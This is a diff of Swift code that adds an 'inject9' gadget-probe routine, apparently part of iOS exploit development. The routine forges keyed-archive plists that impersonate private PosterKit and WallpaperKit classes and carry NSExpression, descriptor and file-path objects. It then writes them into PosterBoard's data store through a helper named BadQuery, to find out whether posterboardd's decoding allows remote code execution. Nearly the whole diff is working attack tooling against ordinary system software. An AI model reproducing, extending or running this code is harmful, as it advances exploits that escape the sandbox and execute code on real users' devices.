@@ -2197,12 +2197,192 @@ class SymHandler {
         }
     }
 
-    static var payloadMetadata:           Data { nska(_MetaProxy()) }
-    static var payloadRendering:          Data { nska(_RenderingProxy()) }
-    static var payloadTitleStyle:         Data { nska(_TitleStyleProxy()) }
-    static var payloadComplication:       Data { nska(_ComplicationProxy()) }
-    static var payloadQuickActions:       Data { nska(_QuickActionsProxy()) }
-    static var payloadComplicationProbe:  Data { nska(_ComplicationProbeProxy()) }
+    // MARK: - probe9 proxy classes
+
+    // NSExpression as complications value — tests if posterboardd's decode path accepts it
+    @objc(_PP9ExprComplProxy)
+    private class _ExprComplicationProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterComplicationLayout") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(NSExpression(forConstantValue: "pp_rce_probe_nsexpression_v1"), forKey: "complications")
+            coder.encode(false,     forKey: "complicationsUseBottomLayout")
+            coder.encode(NSArray(), forKey: "sidebarComplications")
+        }
+    }
+
+    // PFPosterDescriptor (empty body) as complications value — tests if initWithCoder: has side effects
+    @objc(_PP9PFDescInner)
+    private class _PFDescriptorInnerProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PFPosterDescriptor") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {}
+    }
+
+    @objc(_PP9PFDescComplProxy)
+    private class _PFDescComplicationProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterComplicationLayout") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(_PFDescriptorInnerProxy(), forKey: "complications")
+            coder.encode(false,     forKey: "complicationsUseBottomLayout")
+            coder.encode(NSArray(), forKey: "sidebarComplications")
+        }
+    }
+
+    // PFPosterPath(r=0 role, c=NSURL) as complications value — tests file-path decode side effects
+    @objc(_PP9PFPPInner)
+    private class _PFPPInnerProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PFPosterPath") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(0, forKey: "r")
+            coder.encode(NSURL(fileURLWithPath: "/var/mobile/pp_pfposterpath_probe"), forKey: "c")
+        }
+    }
+
+    @objc(_PP9PFPPComplProxy)
+    private class _PFPPComplicationProxy: NSObject, NSCoding {
+        let inner = _PFPPInnerProxy()
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterComplicationLayout") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(inner,     forKey: "complications")
+            coder.encode(false,     forKey: "complicationsUseBottomLayout")
+            coder.encode(NSArray(), forKey: "sidebarComplications")
+        }
+    }
+
+    // PRPosterTitleStyleConfiguration with NSString instead of PRPosterSystemTimeFontConfiguration
+    // — tests whether timeFontConfiguration is also decoded via unrestricted decodeObjectForKey:
+    @objc(_PP9TitleFontStrProxy)
+    private class _TitleStyleFontStrProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterTitleStyleConfiguration") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(false,                                 forKey: "alternateDateEnabled")
+            coder.encode(Double(0.5),                           forKey: "contentsLuminence")
+            coder.encode("",                                    forKey: "groupName")
+            coder.encode(false,                                 forKey: "isAdaptiveTimeHeightUserConfigured")
+            coder.encode(Double(0),                             forKey: "preferredTimeMaxY")
+            coder.encode(Double(0),                             forKey: "preferredTimeMaxYLandscape")
+            coder.encode(Int64(0),                              forKey: "preferredTitleAlignment")
+            coder.encode(Int64(0),                              forKey: "preferredTitleLayout")
+            coder.encode(NSString(string: "pp_font_type_probe"), forKey: "timeFontConfiguration")
+            coder.encode("",                                    forKey: "timeNumberingSystem")
+            coder.encode(Int64(0),                              forKey: "titleContentStyle")
+            coder.encode(false,                                 forKey: "userConfigured")
+            coder.encode(Int64(1),                              forKey: "version")
+        }
+    }
+
+    static var payloadMetadata:                   Data { nska(_MetaProxy()) }
+    static var payloadRendering:                  Data { nska(_RenderingProxy()) }
+    static var payloadTitleStyle:                 Data { nska(_TitleStyleProxy()) }
+    static var payloadComplication:               Data { nska(_ComplicationProxy()) }
+    static var payloadQuickActions:               Data { nska(_QuickActionsProxy()) }
+    static var payloadComplicationProbe:          Data { nska(_ComplicationProbeProxy()) }
+    static var payloadComplicationExprProbe:      Data { nska(_ExprComplicationProxy()) }
+    static var payloadComplicationPFDescProbe:    Data { nska(_PFDescComplicationProxy()) }
+    static var payloadComplicationPFPPProbe:      Data { nska(_PFPPComplicationProxy()) }
+    static var payloadTitleStyleFontStrProbe:     Data { nska(_TitleStyleFontStrProxy()) }
+
+    // MARK: - inject9: gadget probe — NSExpression / PFPosterDescriptor / PFPosterPath as complications
+    //         Also probes timeFontConfiguration type restriction (NSString vs PRPosterSystemTimeFontConfiguration)
+    //         Scans both configurations/ and staticdescriptors/ for maximum WallpaperKit coverage.
+    //         Gadgets rotate per config index mod 3 so multiple configs each test a different candidate.
+
+    @discardableResult
+    static func inject9() -> String {
+        var diag = ["=== Inject v9 (gadget probe) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        let exprData    = payloadComplicationExprProbe
+        let pfDescData  = payloadComplicationPFDescProbe
+        let pfppData    = payloadComplicationPFPPProbe
+        let fontStrData = payloadTitleStyleFontStrProbe
+
+        diag.append("probe payloads:")
+        diag.append("  NSExpression complication: \(exprData.count)b")
+        p7DumpNSKAKeys(data: exprData,    indent: "    ", diag: &diag)
+        diag.append("  PFPosterDescriptor complication: \(pfDescData.count)b")
+        p7DumpNSKAKeys(data: pfDescData,  indent: "    ", diag: &diag)
+        diag.append("  PFPosterPath complication: \(pfppData.count)b")
+        p7DumpNSKAKeys(data: pfppData,    indent: "    ", diag: &diag)
+        diag.append("  titleStyle NSString font probe: \(fontStrData.count)b")
+        p7DumpNSKAKeys(data: fontStrData, indent: "    ", diag: &diag)
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        let extBase   = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        // Three gadget candidates rotated per config index so multiple configs hit different paths
+        let gadgets: [(String, Data)] = [
+            ("NSExpression",      exprData),
+            ("PFPosterDescriptor", pfDescData),
+            ("PFPosterPath",      pfppData),
+        ]
+
+        var totalWritten = 0
+        for extName in allExts where extName.contains("WallpaperKit") {
+            for subdir in ["configurations", "staticdescriptors"] {
+                let sdPath = "\(extBase)/\(extName)/\(subdir)"
+                guard let sdH = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sdH.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for (cfgIdx, cfg) in configs.enumerated() where !cfg.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(cfg)/versions"
+                    guard let versH = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { versH.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        guard let vH = try? BadQuery.consume(path: vPath, create: true) else { continue }
+                        defer { vH.release() }
+                        _ = (try? fm.contentsOfDirectory(atPath: vPath)) ?? []
+
+                        let (gadgetLabel, gadgetData) = gadgets[cfgIdx % gadgets.count]
+                        let probeFiles: [(String, String, Data)] = [
+                            ("titleStyle",   "com.apple.posterkit.provider.instance.titleStyleConfiguration.plist",  fontStrData),
+                            ("rendering",    "com.apple.posterkit.provider.instance.renderingConfiguration.plist",   payloadRendering),
+                            ("complication", "com.apple.posterkit.provider.instance.complicationLayout.plist",       gadgetData),
+                            ("quickActions", "com.apple.posterkit.provider.instance.quickActions.plist",             payloadQuickActions),
+                        ]
+                        diag.append("\n\(extName.prefix(22))/\(subdir.prefix(6))/\(cfg.prefix(8))/v\(ver) [compl=\(gadgetLabel)]:")
+                        for (name, fileName, payload) in probeFiles {
+                            let path = "\(vPath)/\(fileName)"
+                            if let fH = try? BadQuery.consume(path: path, create: true) { fH.release() }
+                            let wrote = fm.createFile(atPath: path, contents: payload, attributes: nil)
+                                || ((try? payload.write(to: URL(fileURLWithPath: path), options: [])) != nil)
+                            diag.append("  \(name): \(wrote ? "WRITTEN \(payload.count)b" : "FAIL")")
+                            if wrote { totalWritten += 1 }
+                        }
+                    }
+                }
+            }
+        }
+        diag.append("\ntotal written: \(totalWritten)")
+        return pbSave(diag)
+    }
 
     // MARK: - inject8: class-matched to ALL providers + NSDictionary probe on WallpaperKit complication
 
